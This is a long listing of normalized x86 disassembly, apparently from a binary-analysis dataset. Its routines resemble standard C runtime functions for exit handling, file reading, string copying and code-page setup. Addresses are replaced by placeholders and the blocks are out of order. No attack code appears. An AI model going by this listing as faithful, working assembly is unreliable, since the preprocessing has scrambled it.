mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_43b52b
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_44927e
push r--data
push r--data
call sub_43b507
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_44a5e0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_448636
call sub_43ceb4
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_44a5e0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_43b5c2
push 0x20
push r--data
call sub_43f8e0
push 0x8
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43b6ed
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_43f925
retn
mov [ rw-data ] 0x1
push 0x8
call sub_442b8f
pop ecx
push [ ebp + 0x8 ]
call sub_43b4aa
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_43fe30
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_43fe30
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_43b788
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_43b7cc
push 0x20
push r--data
call sub_43f8e0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_43ff67
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_43f925
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_43b788
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_43b718
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_442c68
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_43fe30
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43b933
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_43b970
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_43b9f8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
pop ebp
retn
sub_43ba20
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x20
pop ebp
retn
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
pop ebp
retn
sub_43ba48
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_440f95
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_43bc19
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_43917d
pop ecx
push eax
call sub_44ad99
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_43a8a0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_43bb9f
push 0xc
push r--data
call sub_43f8e0
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_43909f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43ba48
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43bc0f
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
call sub_43f925
retn
sub_43bc19
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_43917d
pop ecx
push eax
call sub_44ad99
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43bc81
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_43bc19
pop ecx
test eax eax
je r-xdata
push esi
call sub_43bcc9
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_43917d
push eax
call sub_44ae6d
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_43bcc9
push 0x14
push r--data
call sub_43f8e0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43bd9a
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_43f925
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4390e0
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_43bd6b
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_43bc81
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_43bc81
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_43bda3
push 0xc
push r--data
call sub_43f8e0
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_43909f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_43bc81
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43bdec
mov eax [ ebp - 0x1c ]
push esi
call sub_43bcc9
pop ecx
jmp r-xdata
call sub_43f925
retn
sub_43bdff
push 0xc
push r--data
call sub_43f8e0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_43f925
retn
call sub_43f608
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_43c04c
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_44af46
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43beb1
mov eax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_43fad0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_43bed2
push 0x14
push r--data
call sub_43f8e0
mov ebx [ ebp + 0x8 ]
mov edi ebx
mov [ ebp - 0x1c ] ebx
xor ecx ecx
cmp ebx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ecx
setge al
cmp eax ecx
je r-xdata
cmp [ ebp + 0xc ] ecx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
mov esi [ ebp + 0x10 ]
cmp esi ecx
setne al
cmp eax ecx
je r-xdata
call sub_43f925
retn
cmp [ ebp + 0xc ] ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esi
push esi
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
test [ esi + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c002
mov eax [ ebp - 0x1c ]
dec [ ebp + 0xc ]
je r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
mov [ edi ] 0x0
dec [ esi + 0x4 ]
js r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
and [ ebp - 0x1c ] 0x0
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
push esi
call sub_4402a7
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov [ edi ] al
inc edi
mov [ ebp - 0x24 ] edi
cmp al 0xa
jne r-xdata
cmp edi ebx
jne r-xdata
mov [ ebp - 0x20 ] eax
cmp eax 0xffffffff
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
and [ ebp - 0x1c ] 0x0
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_43c00a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_43c072
mov edi edi
push ebp
mov ebp esp
push esi
call sub_43c05f
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_43c00a
pop ecx
mov esi eax
call sub_43c04c
mov [ eax ] esi
pop esi
pop ebp
retn
sub_43c0a0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_43c1c4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_44b1dd
mov esi [ eax ]
call sub_44b1dd
cmp esi [ eax ]
jl r-xdata
call sub_44b1e3
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_43c1ec
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_43ff67
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_43c1c4
push eax
push edi
push esi
call sub_43f118
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_43de17
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_43c270
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_43c330
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_43c3a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_43c3f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_43ddd2
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_43de17
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_43de17
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_43de17
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_43de17
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_44a386
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_4381f8
push [ ebp - 0x1c ]
call sub_4381f8
push [ ebp - 0x20 ]
call sub_4381f8
push [ ebp - 0x28 ]
call sub_4381f8
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_4381f8
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_4461f2
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_43e133
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_43e133
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_43a8a0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_43a8a0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_43a8a0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
